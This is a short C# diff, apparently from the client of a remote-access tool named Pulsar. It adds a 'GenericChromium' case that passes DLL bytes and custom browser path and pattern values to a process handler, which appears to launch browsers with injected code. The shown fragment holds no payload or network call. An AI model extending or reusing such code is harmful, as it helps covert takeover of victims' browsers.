@@ -335,6 +335,14 @@ namespace Pulsar.Client.Messages
 
             switch (name)
             {
+                case "GenericChromium":
+                    ProcessHandler.StartGenericChromium(
+                        dllBytes,
+                        message.CustomBrowserPath,
+                        message.CustomSearchPattern,
+                        message.CustomReplacementPath
+                    );
+                    break;
                 case "Chrome":
                     ProcessHandler.Startchrome(dllBytes);
                     break;
